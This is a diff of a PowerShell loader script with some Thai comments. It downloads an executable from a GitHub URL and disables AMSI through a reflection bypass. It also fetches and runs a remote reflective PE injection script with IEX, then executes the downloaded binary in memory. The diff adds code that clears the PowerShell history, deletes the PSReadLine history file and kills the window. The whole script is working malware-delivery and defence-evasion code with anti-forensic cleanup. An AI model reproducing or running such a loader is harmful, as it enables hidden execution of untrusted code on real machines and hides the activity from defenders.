@@ -1,10 +1,9 @@
 # ===============================================
-# Run Native EXE (C/C++) from URL in Memory
-# Full Reflective PE Injection - Ready to Use
+# Run Native EXE from URL + Keep Console + Clear PowerShell History
 # ===============================================
 
-$Url = "https://raw.githubusercontent.com/VortexStore/headhunter/refs/heads/main/WebLoader.exe"   # ← Change this only
-$Arguments = ""                                 # Optional: e.g. "-silent /nogui"
+$Url = "https://raw.githubusercontent.com/VortexStore/headhunter/refs/heads/main/WebLoader.exe"
+$Arguments = ""
 
 Write-Host "[+] Downloading EXE from URL..." -ForegroundColor Cyan
 
@@ -21,13 +20,13 @@ try {
 # AMSI Bypass
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-# Load Reflective PE Loader (supports Native C/C++ EXE)
+# Load Reflective PE Loader
 Write-Host "[+] Loading Reflective PE Injection..." -ForegroundColor Yellow
 
 try {
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/charnim/Invoke-ReflectivePEInjection.ps1/main/Invoke-ReflectivePEInjection.ps1')
 } catch {
-    Write-Host "[-] Failed to load Reflective Loader. Run as Administrator." -ForegroundColor Red
+    Write-Host "[-] Failed to load Reflective Loader." -ForegroundColor Red
     exit
 }
 
@@ -35,11 +34,31 @@ Write-Host "[+] Injecting and running EXE in memory..." -ForegroundColor Green
 
 try {
     if ($Arguments) {
-        Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $Arguments -ForceASLR
+        Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $Arguments -ForceASLR -CreateNewConsole
     } else {
-        Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR
+        Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR -CreateNewConsole
     }
-    Write-Host "[+] Executed successfully in memory (C++ / Native supported)" -ForegroundColor Green
+    
+    Write-Host "[+] Executed successfully" -ForegroundColor Green
+    
+    # รอให้ผู้ใช้กดปุ่มก่อนลบประวัติ (ป้องกันหน้าต่างปิดทันที)
+    Write-Host "Press any key to clear history and exit..." -ForegroundColor Yellow
+    $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") | Out-Null
+
 } catch {
     Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
 }
+
+# ================== ลบประวัติ PowerShell อัตโนมัติ ==================
+Write-Host "[+] Clearing PowerShell history..." -ForegroundColor DarkGray
+
+try {
+    Clear-History -ErrorAction SilentlyContinue
+    Clear-Content -Path (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
+    [System.GC]::Collect()
+    Write-Host "[+] History cleared successfully" -ForegroundColor DarkGray
+} catch { }
+
+# ปิดหน้าต่างอัตโนมัติ
+Stop-Process -Id $PID -Force
